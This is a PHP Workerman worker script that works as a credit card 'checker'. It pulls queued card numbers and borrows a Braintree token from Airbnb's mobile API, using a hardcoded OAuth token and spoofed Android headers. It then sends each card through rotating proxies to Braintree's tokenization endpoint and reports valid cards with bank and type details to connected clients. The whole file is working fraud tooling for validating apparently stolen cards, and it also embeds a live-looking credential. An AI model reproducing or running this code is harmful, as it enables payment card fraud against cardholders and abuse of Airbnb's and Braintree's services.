<?php

use SleekDB\Store;
use GatewayClient\Gateway;
use Workerman\Worker;
use Workerman\Timer;

use GuzzleHttp\Client;
use GuzzleHttp\Pool;
use GuzzleHttp\Psr7\Request;



$required = [
    'vendor/autoload.php',
    'app/config/config.php',
    'lib/Fun.php',
];
foreach ($required as $require) {
    $r = __DIR__ . '/../' . $require;
    if (file_exists($r)) {
        require_once $r;
    } else {
        echo "[~] Unable to include: {$r}\n";
    }
}

Gateway::$registerAddress = '0.0.0.0:1236';

$task = new Worker();
$task->name = 'Queue Worker';
$task->count = 4;
$task->onWorkerStart = function ($task) {

    _retry:

    $time_interval = 1.5;
    $proxy_file = "";
    $Oauth_Token = "5n5hl4ni3ovc58a40lr36wugf";

    $fa_header = [
        "Host" => "api.airbnb.com",
        "X-Return-Strategy" => "single",
        "X-Airbnb-Request-Client-Origin" => "com.airbnb.android.feat.checkout.payments.fragments.creditcardinput.CheckoutCreditCardInputFragment.onCreate(Unknown Source:19)",
        "Accept-Encoding" => "gzip, deflate",
        "X-Airbnb-Supports-Airlock-V2" => "true",
        "Content-Type" => "application/json; charset=UTF-8",
        "Content-Length" => "0",
        "User-Agent" => "Airbnb/28001488 Name/GLOBAL_TRAVEL AppVersion/23.39 ReleaseStage/release Android/12 Device/INFINIX_Infinix X6815C Carrier/SMART Type/Phone AndroidAPILevel/31",
        "X-Airbnb-Sid:",
        "X-Airbnb-Network-Type" => "wifi",
        "X-Airbnb-Screensize" => "w=360.0;h=783.6667",
        "X-Airbnb-Device-Id" => substr(md5(date('r')), 0, strlen("68cce6cb3614dbb1")),
        "X-Airbnb-Carrier-Country" => "ph",
        "X-Airbnb-Oauth-Token" => $Oauth_Token,
        "X-Airbnb-Timezone" => "Asia/Manila",
        "X-Airbnb-Everest-Device-Id" => "1697318030.u177WGTuwrqmpZeAPc4d.7xzpWuoBWYPgpXN7-4zYgE6CZkxnO9dBwt6W2OVht54",
        "X-Airbnb-Advertising-Id" => "ae1ec744-7366-4e4d-91c3-96969018abfb",
    ];
    $token_fetch = new Client([
        'verify' => false,
        'http_errors' => false,
    ]);
    $url = "https://api.airbnb.com/v2/braintree_client_tokens?client_id=3092nxybyb0otqw18e8nh5nty&locale=en-US&currency=USD";
    $token_fetch_response = $token_fetch->post($url, [
        'headers' => $fa_header,
    ]);
    $responseBody = json_decode($token_fetch_response->getBody()->getContents(), true);
    if (!is_array($responseBody) || (is_array($responseBody) && !isset($responseBody['braintree_client_token']['token']))) {
        echo "\n[!] Unable to fetch Token for automation! Contact 2077Dev\n\n{$token_fetch_response->getBody()->getContents()}";
        sleep(10);
        goto _retry;
    } else {

        $token = $responseBody['braintree_client_token']['token'];
        echo "\n[+] Token fetched: ". substr($token, 0, 20) ."...\n\n";
        $get_token = json_decode(base64_decode($token), true);
        $token = $get_token['authorizationFingerprint'];

        $timer_id = Timer::add($time_interval, function () use ($proxy_file, $token) {

            $init_queue = new Store(LOG_DB['checker'], LOG_DB['data_dir'], SleekDB);
            $pending_scans = $init_queue->findBy(['status', '==', 'pending'], ['_id' => 'asc'], 10);

            if (count($pending_scans) > 0) {

                // grab proxy
                if (empty($proxy_file) && isset($pending_scans[0]['proxy']) && !empty(isset($pending_scans[0]['proxy']))) {

                    $proxy_parts = array_filter(explode("|", $pending_scans[0]['proxy']));

                    if (count($proxy_parts) === 4) {
                        @list($ip, $port, $user, $pass) = $proxy_parts;
                        $proxy_file = "{$user}:{$pass}@{$ip}:{$port}";
                    } elseif (count($proxy_parts) > 0) {
                        @list($ip, $port) = $proxy_parts;
                        $proxy_file = "{$ip}:{$port}";
                    }
                }

                $requests = function ($pending_scans) use ($token) {

                    foreach ($pending_scans as $x => $cc) {

                        if (!isset($cc['proxy'], $cc['card'])) {
                            continue;
                        }

                        $type = null;
                        $_card = trim($cc['card']);
                        $parts = explode("|", $_card);
                        switch (count($parts)) {
                            case 4:
                                @list($card, $month, $year, $cvv) = $parts;
                                break;

                            default:
                                @list($card, $month, $year) = $parts;
                                $cvv = 1337;
                                break;
                        }


                        $data = json_decode(file_get_contents(CONFIG_DIR . 'airbnb_payload.json'), true);

                        $data['clientSdkMetadata']['sessionId'] = md5(date('r'));
                        $data['variables']['input']['creditCard']['number'] = $card;
                        $data['variables']['input']['creditCard']['expirationMonth'] = $month;
                        $data['variables']['input']['creditCard']['cvv'] = $cvv;

                        if (strlen($year) === 4) {
                            $data['variables']['input']['creditCard']['expirationYear'] = $year;
                        } else {
                            $data['variables']['input']['creditCard']['expirationYear'] = "20{$year}";
                        }

                        $header = [
                            "Authorization" => "Bearer {$token}",
                            "Braintree-Version" => "2018-03-06",
                            "User-Agent" => "braintree/android/4.37.0",
                            "Accept-Encoding" => "gzip, deflate",
                            "Accept-Language" => "en",
                            "Content-Type" => "application/json",
                            "Host" => "payments.braintree-api.com",
                            "Connection" => "close",
                            "Content-Length" => strlen(json_encode($data)),
//        "Accept-Encoding: gzip, deflate",
                        ];

                        $request = new Request(
                            'POST',
                            'https://payments.braintree-api.com/graphql',
                            $header,
                            json_encode($data)
                        );

                        yield $request;

                    }

                };

                try {

//                    $proxy_file = "192.168.254.2:8080";

                    if (!empty($proxy_file)) {
                        echo "Proxy is set to: {$proxy_file}\n";
                        $client = new Client([
                            'proxy' => $proxy_file,
                            'verify' => false,
                            'http_errors' => false,
                            'timeout' => 30,
                            'concurrency' => 25,
                        ]);
                    } else {
                        echo "No Proxy is set\n";
                        $client = new Client([
                            'verify' => false,
                            'http_errors' => false,
                            'timeout' => 30,
                            'concurrency' => 25,
                        ]);
                    }

                    $pool = new Pool($client, $requests($pending_scans), [

                        'fulfilled' => function ($response, $index) use (&$pending_scans) {

                            echo "[+] Socket Server: {$pending_scans[$index]['socket_server']}\n";

                            $total = count($pending_scans);
                            $line = ($index + 1);
                            $init_cards = new Store(LOG_DB['check_cards'], LOG_DB['data_dir'], SleekDB);
                            $init_queue = new Store(LOG_DB['checker'], LOG_DB['data_dir'], SleekDB);
                            $scanned = new Store(LOG_DB['scanned'], LOG_DB['data_dir'], SleekDB);
                            $stored_scans = new Store(LOG_DB['stored_scans'], LOG_DB['data_dir'], SleekDB);
                            $active_users = new Store(LOG_DB['active_users'], LOG_DB['data_dir'], SleekDB);
                            $get_client = $active_users->findBy(['user_id', '===', $pending_scans[$index]['client_id']]);

                            if ($response instanceof GuzzleHttp\Psr7\Response && count($get_client) && isset($get_client[0]['socket_id'])) {

                                $status = $response->getStatusCode();
                                echo "Request Status: {$status}\n";

                                $socket_id = $get_client[0]['socket_id'];

                                switch ($status) {

                                    case 200: // live

                                        $check = json_decode($response->getBody(), true) ?? [];

                                        if (isset(
                                            $check['data']['tokenizeCreditCard']['creditCard']['binData']['productId'],
                                        )) {

                                            echo "\n\n".json_encode($check, JSON_PRETTY_PRINT)."\n\n";


                                            $product = $check['data']['tokenizeCreditCard']['creditCard']['binData']['productId'];
                                            $credit_debit = ucfirst([
                                                'yes' => 'debit',
                                                'no' => 'credit'
                                            ][strtolower($check['data']['tokenizeCreditCard']['creditCard']['binData']['debit'])]);

                                            $scan_result = [
                                                'task' => 'type_checker',
                                                'scan_type' => 'type_check',
                                                'client_id' => trim($pending_scans[$index]['client_id']),
                                                'type' => 'scan_result',
                                                'cc_status' => "[ {$check['data']['tokenizeCreditCard']['creditCard']['brand']} | {$credit_debit} ] " . trim($pending_scans[$index]['card']) . " [ {$product} | {$check['data']['tokenizeCreditCard']['creditCard']['binData']['issuingBank']} {$check['data']['tokenizeCreditCard']['creditCard']['binData']['countryOfIssuance']} ]"
                                            ];

                                            if(Gateway::isOnline($socket_id))
                                            {
                                                echo "Client online: {$socket_id}\n";
                                                Gateway::sendToClient($socket_id, json_encode($scan_result, JSON_THROW_ON_ERROR));
                                            } else {
                                                // store offline
                                                echo "Client offline: {$socket_id}\n";
                                                $store_offline = $stored_scans->insert($scan_result);
                                            }

                                            $_check = $scanned->findBy(['card','===',$pending_scans[$index]['card']]);
                                            if (count($_check) <= 0) {
                                                echo "Saving {$pending_scans[$index]['card']} ...\n";
                                                $save_scanned = $scanned->insert([
                                                    'user_id' => $pending_scans[$index]['client_id'],
                                                    'card' => trim($pending_scans[$index]['card']),
                                                    'bank' => $check['data']['tokenizeCreditCard']['creditCard']['binData']['issuingBank'],
                                                    'card_check' => false,
                                                    'mode_status' => 'checked',
                                                    'type' => $product,
                                                    'updated' => date(CONFIG['time_stamp_format']),
                                                    'bin_data' => $check['data']['tokenizeCreditCard']['creditCard']['binData'],
                                                ]);
                                            } elseif (isset($_check[0]['card_check'])) {
                                                echo "Updating {$pending_scans[$index]['card']} ...\n";
                                                $update = $_check[0];
                                                $update['bank'] = $check['data']['tokenizeCreditCard']['creditCard']['binData']['issuingBank'];
                                                $update['type'] = $product;
                                                $update['updated'] = date(CONFIG['time_stamp_format']);
                                                $update['bin_data'] = $check['data']['tokenizeCreditCard']['creditCard']['binData'];
                                                $update_scanned = $scanned->update($update);

                                            }

                                            goto _skip;

                                            $cc_info = json_encode([
                                                'cc_info' => trim($pending_scans[$index]['card']),
                                                'card_info' => $check['data']['tokenizeCreditCard']['creditCard']
                                            ], JSON_THROW_ON_ERROR);

                                            switch (strlen($product)) {
                                                case 3: // 3 chars card

                                                    echo "[~] Checking {$product} :: {$check['data']['tokenizeCreditCard']['creditCard']['binData']['issuingBank']}\n\n";

                                                    echo "[+] Connected to Socket Server!\n";

                                                    // save scanned

                                                    $_check = $scanned->findBy(['card','===',$pending_scans[$index]['card']]);
                                                    if (count($_check) <= 0) {
                                                        echo "Saving {$pending_scans[$index]['card']} ...\n";
                                                        $save_scanned = $scanned->insert([
                                                            'card' => $pending_scans[$index]['card'],
                                                            'bank' => $check['data']['tokenizeCreditCard']['creditCard']['binData']['issuingBank'],
                                                            'type' => $product
                                                        ]);
                                                    }

                                                    Gateway::sendToClient($socket_id, json_encode([
                                                        'task' => 'type_checker',
                                                        'client_id' => trim($pending_scans[$index]['client_id']),
                                                        'type' => 'scan_result',
                                                        'cc_status' => trim($pending_scans[$index]['card']) . " : {$product} @ {$check['data']['tokenizeCreditCard']['creditCard']['binData']['issuingBank']}"
                                                    ], JSON_THROW_ON_ERROR));


                                                    switch ($product) {

                                                        case 'MPL':
                                                        case 'MCG':
                                                            echo " X :: [{$status}] @( {$line}/{$total} ) " . trim($pending_scans[$index]['card']) . " [ {$product} ] {$check['data']['tokenizeCreditCard']['creditCard']['binData']['issuingBank']}\n";
                                                            //file_put_contents("info/CARDS_{$product}",  $cc_info. PHP_EOL, FILE_APPEND);
                                                            break;

                                                        case 'MCS':
                                                            echo " VALID ? :: [{$status}] @( {$line}/{$total} ) " . trim($pending_scans[$index]['card']) . " :: BANK -> [ {$product} ] {$check['data']['tokenizeCreditCard']['creditCard']['binData']['issuingBank']}\n";

                                                            //file_put_contents("info/CARDS_{$product}",  $cc_info. PHP_EOL, FILE_APPEND);
                                                            break;

                                                        default: // 🤨
                                                            echo " WTF :: [{$status}] @( {$line}/{$total} ) " . trim($pending_scans[$index]['card']) . " :: BANK -> [ {$product} ] {$check['data']['tokenizeCreditCard']['creditCard']['binData']['issuingBank']}\n";

                                                            //file_put_contents("info/CARDS_{$product}",  $cc_info. PHP_EOL, FILE_APPEND);
                                                            break;
                                                    }

                                                    break;

                                                default:
                                                    echo " ERR :: [{$status}] @( {$line}/{$total} ) " . trim($pending_scans[$index]['card']) . " ~ [ {$product} ] {$check['data']['tokenizeCreditCard']['creditCard']['binData']['issuingBank']}\n";
                                                    //file_put_contents("info/CARDS_INFO_{$product}",  $cc_info. PHP_EOL, FILE_APPEND);
                                                    Gateway::sendToClient($socket_id, json_encode([
                                                        'task' => 'type_checker',
                                                        'type' => 'error',
                                                        'data' => $response->getBody()
                                                    ], JSON_THROW_ON_ERROR));
                                                    break;
                                            }

                                            _skip:

                                        } else {
                                            echo "Error: " . $response->getBody() . PHP_EOL;
                                            Gateway::sendToClient($socket_id, json_encode([
                                                'task' => 'type_checker',
                                                'type' => 'error',
                                                'data' => $response->getBody()
                                            ], JSON_THROW_ON_ERROR));

                                            // delete
                                            echo "Deleting {$pending_scans[$index]['card']}..\n";
                                            $delete = $init_cards->deleteBy(['card','==',$pending_scans[$index]['card']]);
                                        }

                                        // delete queue
                                        echo "Deleting {$pending_scans[$index]['card']} from queue..\n";
                                        $delete = $init_queue->deleteBy(['card','==',$pending_scans[$index]['card']]);

                                        break;

                                    case 500:
                                        echo " 500ERR :: [{$status}] @( {$line}/{$total} ) " . trim($pending_scans[$index]['card']) . " -> " . $response->getBody() . PHP_EOL;
                                        Gateway::sendToClient($socket_id, json_encode([
                                            'task' => 'type_checker',
                                            'type' => 'error',
                                            'data' => $response->getBody()
                                        ], JSON_THROW_ON_ERROR));
                                        break;

                                    default:
                                        echo " ERROR! :: [{$status}] @( {$line}/{$total} ) " . trim($pending_scans[$index]['card']) . " -> " . $response->getBody() . PHP_EOL;
                                        Gateway::sendToClient($socket_id, json_encode([
                                            'task' => 'type_checker',
                                            'type' => 'error',
                                            'data' => $response->getBody()
                                        ], JSON_THROW_ON_ERROR));
                                        break;
                                }

                            } else {
                                echo " OOPS! :: REQUEST @( {$line}/{$total} ) " . trim($pending_scans[$index]['card']) . " | DEAD PROXY " . PHP_EOL;
                            }

                        },
                        'rejected' => function ($reason, $index) use (&$pending_scans) {


                            $stored_scans = new Store(LOG_DB['stored_scans'], LOG_DB['data_dir'], SleekDB);
                            $active_users = new Store(LOG_DB['active_users'], LOG_DB['data_dir'], SleekDB);
                            $get_client = $active_users->findBy(['user_id', '===', $pending_scans[$index]['client_id']]);

                            if (count($get_client) && isset($get_client[0]['socket_id'])) {

                                $total = count($pending_scans);
                                $line = ($index + 1);
                                if ($reason instanceof GuzzleHttp\Exception\ClientException) {
                                    echo " X000 :: @( {$line}/{$total} ) " . trim($pending_scans[$index]['card']) . " -> " .  $reason->getResponse()->getBody() . PHP_EOL;


                                    Gateway::sendToClient($pending_scans[$index]['client_id'], json_encode([
                                        'task' => 'type_checker',
                                        'type' => 'error',
                                        'data' => $reason->getResponse()->getBody()
                                    ], JSON_THROW_ON_ERROR));

                                } else {
                                    echo " ERROR :: REQUEST @( {$line}/{$total} ) " . trim($pending_scans[$index]['card']) . " | DEAD PROXY " . PHP_EOL;
                                }

                            }

                        },

                    ]);

                    $promise = $pool->promise();
                    $promise->wait();

                } catch (Error $error) {
                    echo "\n\nError: {$error}\n\n";
                }

                // update status

                // send to dashboard
            } else {
                echo ".";
            }
        });

    }
};

// is defined global start check
if(!defined('GLOBAL_START'))
{
    Worker::runAll();
}
